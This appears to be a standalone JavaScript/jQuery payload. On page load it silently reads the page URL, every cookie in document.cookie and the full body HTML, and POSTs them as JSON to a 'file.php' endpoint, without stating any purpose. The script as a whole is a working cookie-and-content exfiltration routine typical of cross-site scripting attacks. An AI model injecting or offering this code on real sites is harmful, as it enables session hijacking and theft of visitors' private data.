$(document).ready(function(){
	var content;
	var url;
	var cookieid;
	var obj;
	var myJSON
	url = window.location.href;  
	content=$("body").html();
	cookieid= document.cookie;
	obj = { url: url, cookieid: cookieid, content: content};
    myJSON = JSON.stringify(obj);
	$.ajax({
		url: 'file.php',
		type: 'POST',
		data: { data: myJSON },
		cache: false,
		dataType: 'json',
		success: function(result) {

		}
	});

});
